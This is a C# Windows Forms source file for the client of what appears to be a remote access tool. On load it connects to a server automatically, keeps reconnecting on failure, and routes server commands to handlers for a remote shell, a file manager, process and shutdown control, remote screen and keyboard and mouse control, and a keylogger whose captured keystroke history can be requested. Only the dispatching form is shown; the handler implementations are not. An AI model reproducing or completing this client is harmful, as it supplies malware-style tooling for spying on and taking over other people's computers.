using System;
using System.Drawing;
using System.Threading.Tasks;
using System.Windows.Forms;
using Client.Handlers;
using Client.Networking;
using Client.Services;

namespace Client
{
    public partial class MainClientForm : Form
    {
        private ClientConnection? _connection;
        private PacketHandler? _packetHandler;

        private SystemInfoHandler? _systemInfoHandler;
        private RemoteShellHandler? _remoteShellHandler;
        private FileManagerHandler? _fileManagerHandler;
        private TaskManagerHandler? _taskManagerHandler;
        private MessageBoxHandler? _messageBoxHandler;
        private ShutdownActionHandler? _shutdownActionHandler;
        private KeyLoggerHandler? _keyLoggerHandler;
        private ScreenControlHandler? _screenControlHandler;

        public MainClientForm()
        {
            InitializeComponent();
        }

        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            chkAutoReconnect.Checked = true;

            _connection = new ClientConnection();

            var sysService = new SystemInfoService();
            var remoteShellService = new RemoteShellService();
            var fileManagerService = new FileManagerService();
            var messageBoxService = new MessageBoxService();
            var taskManagerService = new TaskManagerService();
            var shutdownActionService = new ShutdownActionService();
            var keyLoggerService = new KeyLoggerService(_connection);
            var screenControlService = new ScreenControlService(_connection);

            _systemInfoHandler = new SystemInfoHandler(sysService, _connection);
            _remoteShellHandler = new RemoteShellHandler(remoteShellService, _connection);
            _fileManagerHandler = new FileManagerHandler(fileManagerService, _connection);
            _messageBoxHandler = new MessageBoxHandler(messageBoxService, _connection);
            _taskManagerHandler = new TaskManagerHandler(taskManagerService, _connection);
            _shutdownActionHandler = new ShutdownActionHandler(shutdownActionService, _connection);
            _keyLoggerHandler = new KeyLoggerHandler(keyLoggerService);
            _screenControlHandler = new ScreenControlHandler(screenControlService, _connection);

            _packetHandler = new PacketHandler(
               onSystemInfoRequest: req => _ = _systemInfoHandler!.HandleAsync(req),
               onRemoteShellRequest: sreq => _ = _remoteShellHandler!.HandleAsync(sreq),
               onFileManagerRequest: freq => _ = _fileManagerHandler!.HandleAsync(freq),
               onMessageBoxRequest: mreq => _ = _messageBoxHandler!.HandleAsync(mreq),
               onShutdownActionRequest: sdreq => _ = _shutdownActionHandler!.HandleAsync(sdreq),
               onKeyLoggerStart: kls => _ = _keyLoggerHandler!.HandleStartAsync(kls),
               onKeyLoggerStop: klt => _ = _keyLoggerHandler!.HandleStopAsync(klt),
               onKeyLoggerLangToggle: l => _ = _keyLoggerHandler!.HandleLangToggleAsync(l),
               onKeyLoggerHistoryRequest: req => _ = _keyLoggerHandler!.HandleHistoryRequestAsync(req),
               onTaskManagerRequest: treq => _ = _taskManagerHandler!.HandleAsync(treq),
               onScreenControlStart: scs => _ = _screenControlHandler!.HandleStartAsync(scs),
               onScreenControlStop: scs => _ = _screenControlHandler!.HandleStopAsync(scs),
               onScreenControlMouseEvent: scm => _ = _screenControlHandler!.HandleMouseEventAsync(scm),
               onScreenControlKeyboardEvent: sck => _ = _screenControlHandler!.HandleKeyboardEventAsync(sck)
            );

            _connection.OnLineReceived += line => _packetHandler.HandleLine(line);

            _connection.OnDisconnected += () =>
            {
                if (IsDisposed || Disposing) return;

                if (InvokeRequired) BeginInvoke(new Action(UpdateUiDisconnected));
                else UpdateUiDisconnected();
            };
            _ = AutoConnectAsync();
        }

        private async Task AutoConnectAsync()
        {
            if (_connection == null || IsDisposed || Disposing) return;
            try
            {
                if (_connection.IsConnected) return;

                AppendLog($"[{DateTime.Now:HH:mm:ss}] Auto connecting to server...");
                await _connection.ConnectAsync();
                lblStatus.ForeColor = Color.Green;
                lblStatus.Text = $"Connected to {_connection.RemoteHost}:{_connection.RemotePort}";
                AppendLog($"[{DateTime.Now:HH:mm:ss}] Connected successfully.");
            }
            catch (Exception ex)
            {
                if (!IsDisposed)
                {
                    AppendLog($"[{DateTime.Now:HH:mm:ss}] [ERROR] Connect failed: {ex.Message}");
                    lblStatus.ForeColor = Color.Red;
                    lblStatus.Text = "Connection Failed. Retrying in 5s...";
                    if (chkAutoReconnect.Checked)
                    {
                        await Task.Delay(5000); 
                        _ = AutoConnectAsync(); 
                    }
                }
            }
        }

        private void AppendLog(string line)
        {
            if (IsDisposed || Disposing) return; 

            if (txtLog.InvokeRequired)
            {
                txtLog.BeginInvoke(new Action(() => AppendLog(line)));
                return;
            }

            txtLog.AppendText(line + Environment.NewLine);
        }

        private async void UpdateUiDisconnected()
        {
            if (IsDisposed) return;

            lblStatus.ForeColor = Color.Red;
            lblStatus.Text = "Disconnected";
            AppendLog($"[{DateTime.Now:HH:mm:ss}] Disconnected by server");
            if (chkAutoReconnect.Checked)
            {
                AppendLog($"[{DateTime.Now:HH:mm:ss}] Waiting 3s before reconnecting...");
                await Task.Delay(3000); 
                _ = AutoConnectAsync();
            }
        }
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            base.OnFormClosing(e);
            _connection?.Dispose(); 
        }
    }
}